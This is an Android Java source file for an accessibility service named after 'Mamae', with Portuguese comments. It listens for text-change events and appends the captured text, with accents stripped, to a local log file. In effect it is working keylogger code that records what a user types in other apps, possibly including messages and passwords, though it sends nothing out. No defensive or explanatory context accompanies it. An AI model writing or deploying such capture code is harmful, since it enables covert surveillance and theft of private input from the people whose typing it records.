package com.example.Mamae;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.text.TextUtils;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.Normalizer;

public class MyAccessibilityService extends AccessibilityService {

    private File logFile;
    private long lastEventTime = 0;
    private static final long EVENT_COOLDOWN_MS = 3000; // mais longo

    @Override
    public void onServiceConnected() {
        logFile = new File(getFilesDir(), "Mamae.txt");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            long now = System.currentTimeMillis();
            if (now - lastEventTime < EVENT_COOLDOWN_MS) return;
            lastEventTime = now;

            String raw = TextUtils.join("", event.getText());
            String normalized = Normalizer.normalize(raw, Normalizer.Form.NFD)
                    .replaceAll("\\p{M}", "");

            writeToFile(normalized); // direto na main thread
        }
    }

    private void writeToFile(String text) {
        if (logFile == null) return;
        try (FileWriter fw = new FileWriter(logFile, true)) {
            fw.append(text).append("\n");
        } catch (IOException ignored) {}
    }

    @Override
    public void onInterrupt() {}
}
